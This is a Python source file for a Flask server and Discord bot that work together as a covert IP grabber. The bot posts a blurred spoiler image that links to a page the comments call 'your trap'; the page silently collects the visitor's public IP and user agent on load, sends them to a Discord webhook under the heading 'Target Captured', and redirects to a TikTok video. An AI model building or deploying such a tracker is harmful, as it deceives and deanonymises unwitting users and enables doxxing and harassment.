# language: Python, file: app.py
import os
import socket
import requests
import threading
import discord
from discord.ext import commands
from flask import Flask, request, render_template_string

_orig_getaddrinfo = socket.getaddrinfo
def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
    return _orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
socket.getaddrinfo = getaddrinfo_ipv4

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
RAILWAY_URL = "https://rnbw-production.up.railway.app"

@app.route('/')
def index():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading...</title>
        <script>
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => {
                    fetch('/log', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ip: d.ip, ua: navigator.userAgent})
                    }).then(() => {
                        window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
                    });
                });
        </script>
    </head>
    <body style="background:#000;"></body>
    </html>
    """)

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ip = data.get('ip', 'Unknown')
    ua = data.get('ua', 'Unknown')
    
    payload = {
        "embeds": [{
            "title": "Target Captured",
            "color": 65280,
            "fields": [
                {"name": "Public IP", "value": f"```{ip}```", "inline": False}
            ]
        }]
    }
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=payload)
    return "ok", 200

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}', flush=True)

@bot.command()
async def send(ctx):
    try:
        # Load your image
        file = discord.File("image.png", filename="SPOILER_image.png")
    except:
        await ctx.send("Error: Could not find image.png in the repo.")
        return

    # Create an embed with NO text. The URL goes to your trap.
    embed = discord.Embed(url=RAILWAY_URL)
    
    # Attach the spoiler image
    embed.set_image(url="attachment://SPOILER_image.png")

    # Send it. The image is blurred. The whole image is a clickable link.
    await ctx.send(embed=embed, file=file)

def run_bot():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN missing.", flush=True)
        return
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"BOT CRASHED: {e}", flush=True)

threading.Thread(target=run_bot, daemon=True).start()
